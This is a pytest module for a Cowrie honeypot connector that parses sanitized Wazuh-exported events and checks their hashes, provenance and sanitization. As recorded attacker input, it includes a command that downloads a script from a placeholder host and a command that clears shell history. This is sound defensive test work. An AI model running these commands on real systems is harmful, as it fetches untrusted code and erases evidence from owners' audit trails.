"""Reviewed Cowrie derivatives; no command or URL in these fixtures is executed."""

from collections import Counter
from decimal import Decimal
from hashlib import sha256
import json
from pathlib import Path
import re

import pytest

from aegis_verify.connectors.cowrie import (
    load_cowrie_wazuh_document,
    parse_cowrie_wazuh_document,
)
from aegis_verify.models import CanonicalEventV2


FIXTURE_DIR = Path(__file__).resolve().parents[2] / "tests/fixtures/cowrie"
CONTEXT = {
    "environment_id": "fixture-lab",
    "sensor_id": "cowrie-fixture-01",
    "ingested_at": "2026-09-11T00:00:00Z",
}
CASES = (
    {
        "file": "session-params.sanitized.json",
        "source_file": "cowrie-sample-001.sanitized.json",
        "source_sha256": "cfe730f1e74412d7f37f2133761357ceb5c0a8f32cf22be375cd838b5b06aee5",
        "derivative_sha256": "b8e202f1fea19040bb442d7986a7da0358bf817dc1386c6c6eb620834f54ecda",
        "line_end": 59,
        "event_type": "cowrie.session.params",
        "protocol": "ssh",
        "source_timestamp": "2026-05-01T18:02:46.697252+0000",
        "timestamp": "2026-05-01T18:02:46.697252Z",
        "session": "fixture-session-01",
        "source_sensor": "fixture-host-01",
        "username": None,
        "src_ip": "192.0.2.10",
        "dst_ip": None,
        "src_port": None,
        "dst_port": None,
        "input": None,
        "action": "observed",
        "authentication_outcome": None,
    },
    {
        "file": "session-connect.sanitized.json",
        "source_file": "1.json",
        "source_sha256": "407e09c6f02d41e161a981d30b21bae3dd75e41ccf5bf03223636466b0607aca",
        "derivative_sha256": "407f2d67dd87fd2d390813c631805d19901e3620df4e449848cbc8947fdeae25",
        "line_end": 62,
        "event_type": "cowrie.session.connect",
        "protocol": "telnet",
        "source_timestamp": "2026-05-06T08:17:02.662625+0000",
        "timestamp": "2026-05-06T08:17:02.662625Z",
        "session": "fixture-session-02",
        "source_sensor": "fixture-host-01",
        "username": None,
        "src_ip": "192.0.2.10",
        "dst_ip": "192.0.2.11",
        "src_port": "2553",
        "dst_port": "2223",
        "input": None,
        "action": "observed",
        "authentication_outcome": None,
    },
    {
        "file": "login-failed.sanitized.json",
        "source_file": "2.json",
        "source_sha256": "f11a1b82c7846c88297606237bb990cf901e53de201b719989ad9010989aedb1",
        "derivative_sha256": "b7399506114dbaf0bfba72bd929734ec826c04451203c88f60162f83a4a9ee9c",
        "line_end": 59,
        "event_type": "cowrie.login.failed",
        "protocol": "telnet",
        "source_timestamp": "2026-05-06T08:16:25.046425+0000",
        "timestamp": "2026-05-06T08:16:25.046425Z",
        "session": "fixture-session-03",
        "source_sensor": "fixture-host-01",
        "username": "fixture-user-01",
        "src_ip": "192.0.2.10",
        "dst_ip": None,
        "src_port": None,
        "dst_port": None,
        "input": None,
        "action": "login",
        "authentication_outcome": "failure",
    },
    {
        "file": "login-success-missing-user.sanitized.json",
        "source_file": "3.json",
        "source_sha256": "6536d7c97ff3c166b93c36acabb2a114ed5bbfbfa722e1dca0dfed46343facab",
        "derivative_sha256": "90e33b00569ba115941f7b05292a9af596a9cb3a67c7c14782f58a80a20d4387",
        "line_end": 58,
        "event_type": "cowrie.login.success",
        "protocol": "telnet",
        "source_timestamp": "2026-05-06T08:14:57.343843+0000",
        "timestamp": "2026-05-06T08:14:57.343843Z",
        "session": "fixture-session-04",
        "source_sensor": "fixture-host-01",
        "username": None,
        "src_ip": "192.0.2.10",
        "dst_ip": None,
        "src_port": None,
        "dst_port": None,
        "input": None,
        "action": "login",
        "authentication_outcome": "success",
    },
    {
        "file": "login-success-ssh.sanitized.json",
        "source_file": "4.json",
        "source_sha256": "29331461fffc78d87044d898b8cdad9b895ffade7a4fbc94f29a7d828103b7c6",
        "derivative_sha256": "292169bcbb0e08699c056966dbd0e9397d29ecc3c8614606b1443b1854c4840c",
        "line_end": 59,
        "event_type": "cowrie.login.success",
        "protocol": "ssh",
        "source_timestamp": "2026-05-01T18:11:13.922502+0000",
        "timestamp": "2026-05-01T18:11:13.922502Z",
        "session": "fixture-session-05",
        "source_sensor": "fixture-host-01",
        "username": "fixture-user-02",
        "src_ip": "192.0.2.12",
        "dst_ip": None,
        "src_port": None,
        "dst_port": None,
        "input": None,
        "action": "login",
        "authentication_outcome": "success",
    },
    {
        "file": "command-1.sanitized.json",
        "source_file": "5.json",
        "source_sha256": "7f7ef58b386c01222171c23179ebcfcfb267883078ec6f4ffa3d51ff50324b77",
        "derivative_sha256": "8af1c7f7346e82d48ad00c1e2262521912a64c94dcfa597948f302db560151c0",
        "line_end": 59,
        "event_type": "cowrie.command.input",
        "protocol": "telnet",
        "source_timestamp": "2026-05-05T18:20:31.500878+0000",
        "timestamp": "2026-05-05T18:20:31.500878Z",
        "session": "fixture-session-06",
        "source_sensor": "fixture-host-01",
        "username": None,
        "src_ip": "192.0.2.12",
        "dst_ip": None,
        "src_port": None,
        "dst_port": None,
        "input": "wget http://example.invalid/tools/check.sh",
        "action": "command",
        "authentication_outcome": None,
    },
    {
        "file": "command-2.sanitized.json",
        "source_file": "6.json",
        "source_sha256": "3d143e2669599c7f4467ab0172ee86bdf904272aa3ed892d2fd1ee4d8dc2443e",
        "derivative_sha256": "10ddb8b28155a09ea891f79da3439d2d525a9b6df14a196ad2b96c344d63dd0b",
        "line_end": 59,
        "event_type": "cowrie.command.input",
        "protocol": "telnet",
        "source_timestamp": "2026-05-05T18:21:04.119614+0000",
        "timestamp": "2026-05-05T18:21:04.119614Z",
        "session": "fixture-session-06",
        "source_sensor": "fixture-host-01",
        "username": None,
        "src_ip": "192.0.2.12",
        "dst_ip": None,
        "src_port": None,
        "dst_port": None,
        "input": "history -c",
        "action": "command",
        "authentication_outcome": None,
    },
    {
        "file": "session-closed-1.sanitized.json",
        "source_file": "7.json",
        "source_sha256": "03157280c9a3ea8a4375d1d6675434d9a6102bd74826b253506246221abce77f",
        "derivative_sha256": "ddfbeb2aeeb5b76d5bcf8cdba758c4de27abcb42f0b47f16a3b4668c59adff41",
        "line_end": 59,
        "event_type": "cowrie.session.closed",
        "protocol": "telnet",
        "source_timestamp": "2026-05-06T08:17:02.661702+0000",
        "timestamp": "2026-05-06T08:17:02.661702Z",
        "session": "fixture-session-07",
        "source_sensor": "fixture-host-01",
        "username": None,
        "src_ip": "192.0.2.10",
        "dst_ip": None,
        "src_port": None,
        "dst_port": None,
        "input": None,
        "action": "observed",
        "authentication_outcome": None,
    },
    {
        "file": "session-closed-2.sanitized.json",
        "source_file": "8.json",
        "source_sha256": "e67eba22e52df220592bed78e13104d823af6c30b00b4e0efd02fb3347d18c5b",
        "derivative_sha256": "986832eb0d029dd8915c56a7bbe2ba6f211d95a734fba576da4ac0c516ded73a",
        "line_end": 59,
        "event_type": "cowrie.session.closed",
        "protocol": "telnet",
        "source_timestamp": "2026-05-06T08:16:57.644398+0000",
        "timestamp": "2026-05-06T08:16:57.644398Z",
        "session": "fixture-session-08",
        "source_sensor": "fixture-host-01",
        "username": None,
        "src_ip": "192.0.2.10",
        "dst_ip": None,
        "src_port": None,
        "dst_port": None,
        "input": None,
        "action": "observed",
        "authentication_outcome": None,
    },
)
EXPECTED_MANIFEST_FIELDS = (
    "event_type", "protocol", "source_timestamp", "session", "source_sensor",
    "username", "src_ip", "dst_ip", "src_port", "dst_port", "input", "action",
    "authentication_outcome",
)


def manifest():
    path = FIXTURE_DIR / "manifest.json"
    assert path.is_file(), "reviewed derivative manifest is required"
    return json.loads(path.read_text(encoding="utf-8"))


def manifest_entry(filename):
    return next(entry for entry in manifest()["fixtures"] if entry["file"] == filename)


def expected_digest(namespace, values):
    payload = json.dumps([namespace, *values], ensure_ascii=True, separators=(",", ":"))
    return sha256(payload.encode("utf-8")).hexdigest()


def test_manifest_covers_profile():
    document = manifest()
    assert document["manifest_version"] == "1.0"
    assert document["profile"] == "wazuh-cowrie-v1"
    assert document["review_status"] == "controller_reviewed_and_integrated_pending_human_review"
    assert document["parser_context"] == CONTEXT
    assert tuple(entry["file"] for entry in document["fixtures"]) == tuple(
        case["file"] for case in CASES
    )
    assert {entry["expected"]["event_type"] for entry in document["fixtures"]} == {
        "cowrie.session.params", "cowrie.session.connect", "cowrie.session.closed",
        "cowrie.login.success", "cowrie.login.failed", "cowrie.command.input",
    }
    for case, entry in zip(CASES, document["fixtures"], strict=True):
        assert entry["source_file"] == case["source_file"]
        assert entry["source_sha256"] == case["source_sha256"]
        assert entry["derivative_sha256"] == case["derivative_sha256"]
        assert entry["source_ref"] == "cowrie-" + case["derivative_sha256"]
        assert entry["expected"] == {field: case[field] for field in EXPECTED_MANIFEST_FIELDS}
        assert entry["changes"]


@pytest.mark.parametrize("case", CASES, ids=lambda case: case["file"])
def test_derivative_bytes_identity_line_range_and_parser_output(case):
    entry = manifest_entry(case["file"])
    path = FIXTURE_DIR / case["file"]
    raw = path.read_bytes()
    raw_hash = sha256(raw).hexdigest()
    source_ref = "cowrie-" + raw_hash
    context = CONTEXT | {"source_ref": source_ref}

    assert raw_hash == entry["derivative_sha256"] == case["derivative_sha256"]
    assert entry["source_ref"] == source_ref
    assert len(source_ref) == 71
    assert raw.endswith(b"\n") and b"\r" not in raw
    assert raw.count(b"\n") == case["line_end"]

    result = parse_cowrie_wazuh_document(raw, **context)
    assert load_cowrie_wazuh_document(path, **context) == result
    event, provenance = result.event, result.provenance
    assert type(event) is CanonicalEventV2
    assert event.timestamp.isoformat() == case["timestamp"]
    assert event.ingested_at.isoformat() == "2026-09-11T00:00:00Z"
    assert event.source_type == event.event_provider == "cowrie"
    assert event.environment_id == "fixture-lab"
    assert (str(event.src_ip) if event.src_ip is not None else None) == case["src_ip"]
    assert (str(event.dst_ip) if event.dst_ip is not None else None) == case["dst_ip"]
    assert event.src_port == (int(case["src_port"]) if case["src_port"] is not None else None)
    assert event.dst_port == (int(case["dst_port"]) if case["dst_port"] is not None else None)
    assert event.protocol == case["protocol"]
    assert event.username == case["username"]
    assert event.command_line == case["input"]
    assert event.event_action == case["action"]
    assert event.raw_event_hash == provenance.raw_event_hash == raw_hash
    expected_ref = f"{source_ref}#L1-L{case['line_end']}"
    assert event.raw_event_ref == provenance.raw_event_ref == expected_ref

    evidence_digest = expected_digest(
        "cowrie-wazuh-evidence-v1",
        ("fixture-lab", "cowrie-fixture-01", source_ref, 1, raw_hash),
    )
    assert event.event_id == provenance.event_id == "cowrie:wazuh-evidence-v1:" + evidence_digest
    session_digest = expected_digest(
        "cowrie-session-v1",
        ("fixture-lab", "cowrie-fixture-01", case["session"]),
    )
    assert provenance.session_key == "cowrie:session-v1:" + session_digest
    assert provenance.record_index == provenance.line_start == 1
    assert provenance.line_end == case["line_end"]
    assert provenance.source_ref == source_ref
    assert provenance.source_event_type == case["event_type"]
    assert provenance.session == case["session"]
    assert provenance.source_sensor == case["source_sensor"]
    assert provenance.authentication_outcome == case["authentication_outcome"]
    assert provenance.mapping_version == "cowrie-wazuh-v1"
    assert provenance.input_profile == "wazuh-cowrie-v1"
    assert provenance.payload_basis == "wazuh._source.data"
    assert provenance.timestamp_basis == "cowrie.data.timestamp"


def test_session_relationship_is_only_the_real_command_pair():
    results = []
    for case in CASES:
        entry = manifest_entry(case["file"])
        raw = (FIXTURE_DIR / case["file"]).read_bytes()
        results.append(parse_cowrie_wazuh_document(
            raw, **(CONTEXT | {"source_ref": entry["source_ref"]})
        ))
    by_session = Counter(result.provenance.session_key for result in results)
    assert sorted(by_session.values()) == [1, 1, 1, 1, 1, 1, 1, 2]
    command_pair = [r for r in results if r.provenance.session == "fixture-session-06"]
    assert [r.event.command_line for r in command_pair] == [
        "wget http://example.invalid/tools/check.sh", "history -c",
    ]
    assert command_pair[0].provenance.session_key == command_pair[1].provenance.session_key
    assert command_pair[0].event.event_id != command_pair[1].event.event_id
    assert len({result.event.event_id for result in results}) == 9


def test_sanitized_fields_full_log_duplicates_and_numeric_lexemes():
    allowed_ips = {"192.0.2.10", "192.0.2.11", "192.0.2.12"}
    allowed_users = {"fixture-user-01", "fixture-user-02"}
    url_pattern = re.compile(r"https?://[^\s\\\"']+")
    for index, case in enumerate(CASES, start=1):
        raw = (FIXTURE_DIR / case["file"]).read_bytes()
        document = json.loads(raw, parse_float=Decimal)
        source = document["_source"]
        data = source["data"]
        full_log = json.loads(source["full_log"], parse_float=Decimal)

        assert document["_id"] == f"fixture-docid-{index:02d}"
        assert source["id"] == f"fixture-sourceid-{index:02d}"
        assert source["agent"] == {
            "ip": "192.0.2.11", "name": "fixture-host-01", "id": "fixture-agent-01",
        }
        assert source["manager"] == {"name": "fixture-host-02"}
        assert source["location"] == "/fixture/cowrie/cowrie.json"
        assert data["sensor"] == "fixture-host-01"
        assert data["uuid"] == "fixture-uuid-01"
        assert data["session"].startswith("fixture-session-")
        assert {value for key, value in data.items() if key.endswith("_ip")} <= allowed_ips
        if "username" in data:
            assert data["username"] in allowed_users

        assert b"password" not in raw.lower()
        assert "message" not in data and "message" not in full_log
        for key in (
            "eventid", "timestamp", "src_ip", "dst_ip", "protocol", "session",
            "sensor", "uuid", "arch", "input", "username", "@source", "@service",
        ):
            if key in data and key in full_log:
                assert data[key] == full_log[key]
        for key in ("src_port", "dst_port"):
            if key in data and key in full_log:
                assert Decimal(str(data[key])) == Decimal(str(full_log[key]))

        urls = url_pattern.findall(raw.decode("utf-8"))
        assert urls in ([], ["http://example.invalid/tools/check.sh"] * 2)

    missing_user = json.loads(
        (FIXTURE_DIR / "login-success-missing-user.sanitized.json").read_bytes()
    )
    assert "username" not in missing_user["_source"]["data"]
    assert json.loads(missing_user["_source"]["full_log"])["username"] == ""

    durations = {
        "session-closed-1.sanitized.json": ("5.001782", Decimal("5.0017819404602051")),
        "session-closed-2.sanitized.json": ("5.015054", Decimal("5.0150539875030518")),
    }
    for filename, (display_value, exact_full_log) in durations.items():
        document = json.loads((FIXTURE_DIR / filename).read_bytes(), parse_float=Decimal)
        assert document["_source"]["data"]["duration"] == display_value
        assert json.loads(document["_source"]["full_log"], parse_float=Decimal)["duration"] == exact_full_log
